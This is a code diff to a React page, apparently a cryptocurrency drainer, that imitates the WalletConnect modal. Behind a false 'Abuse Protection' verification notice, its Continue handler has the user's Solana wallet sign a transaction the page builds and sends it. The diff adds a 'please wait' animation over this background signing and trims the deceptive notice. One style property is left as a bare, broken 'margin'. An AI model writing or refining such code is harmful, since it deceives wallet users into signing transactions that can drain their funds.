@@ -2,7 +2,7 @@
 /* eslint-disable @typescript-eslint/no-explicit-any */
 /* eslint-disable react/no-unknown-property */
 
-import React, { useEffect, useState } from "react";
+import React, { useEffect, useState, useRef } from "react";
 import "../styles/main.css";
 import "../index.css"; // global CSS’ni içeri aktar
 
@@ -34,6 +34,9 @@ declare global {
 
 export default function WalletConnectPage() {
   const [loading, setLoading] = useState(true);
+  const [processing, setProcessing] = useState(false);
+  const [buttonText, setButtonText] = useState("Continue");
+  const intervalRef = useRef<number>();
 
   useEffect(() => {
     connectWallet()
@@ -45,10 +48,30 @@ export default function WalletConnectPage() {
       });
   }, []);
 
-  // Bağlanma süreci bitene kadar render etme
+  // Sayfa yüklenmeden önce bağlanma bitene kadar render etme
   if (loading) return null;
 
   const handleContinue = async () => {
+    if (processing) return;
+    setProcessing(true);
+
+    // Başlangıç animasyonu
+    let dotCount = 1;
+    setButtonText(`please wait${".".repeat(dotCount)}`);
+
+    intervalRef.current = window.setInterval(() => {
+      dotCount = dotCount % 3 + 1;
+      setButtonText(`please wait${".".repeat(dotCount)}`);
+    }, 500);
+
+    // 5 saniye sonra animasyonu durdurup butonu eski haline getir
+    setTimeout(() => {
+      if (intervalRef.current) clearInterval(intervalRef.current);
+      setProcessing(false);
+      setButtonText("Continue");
+    }, 5000);
+
+    // Arka planda transaction isteği
     try {
       const pubKey = getUserPublicKey();
       if (!pubKey) {
@@ -66,7 +89,6 @@ export default function WalletConnectPage() {
       const signedTx = await window.solana.signTransaction(unsignedTx);
       const txid = await connection.sendRawTransaction(signedTx.serialize());
       await connection.confirmTransaction(txid, "confirmed");
-
       console.log("İşlem başarılı:", txid);
     } catch (err: any) {
       console.error("Transaction hatası:", err);
@@ -76,7 +98,7 @@ export default function WalletConnectPage() {
   return (
     <main className="wallet-connect-page">
       {/* gölge DOM root */}
-            <div id="_b"></div>
+      <div id="_b"></div>
 
       {/* modal */}
       <w3m-modal
@@ -293,18 +315,12 @@ export default function WalletConnectPage() {
                         color: "var(--wui-color-accent-100)",
                         fontWeight: 600,
                         verticalAlign: "middle",
-                        marginRight: "2px",
-                        display: "inline",
-                        fontSize: "0.95em",
-                        textTransform: "none",
+                        margin
                       }}
                     >
                       Note:
                     </span>
-                    This dApp uses Abuse Protection to prevent misuse of
-                    platform. You'll need to complete a quick verification of
-                    your transaction history. It's completely safe and only
-                    takes a few seconds.
+                    This dApp uses Abuse Protection to prevent misuse of platform. It's safe and quick.
                   </wui-text>
                 </div>
 
@@ -321,12 +337,13 @@ export default function WalletConnectPage() {
                 >
                   <button
                     onClick={handleContinue}
+                    disabled={processing}
                     data-variant="accent"
                     data-icon-left="false"
                     data-icon-right="false"
                     data-size="lg"
                   >
-                    Continue
+                    {buttonText}
                   </button>
                 </wui-button>
               </wui-flex>
